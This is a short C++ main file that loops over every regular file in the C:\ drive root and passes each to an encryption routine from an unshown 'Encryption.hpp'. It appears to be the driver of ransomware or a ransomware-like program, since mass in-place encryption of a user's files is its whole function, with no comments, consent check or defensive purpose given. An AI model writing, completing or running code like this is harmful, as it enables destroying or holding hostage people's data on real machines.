#include "Encryption.hpp"

auto main() -> int 
{
	Encryption enc;

	std::string path = "C:\\";

	for (const auto& entry : std::filesystem::directory_iterator(path)) {
		if (std::filesystem::is_regular_file(entry.path())) {
			enc.EncryptBefore(entry.path().string());
		}
	}

	return 0;
}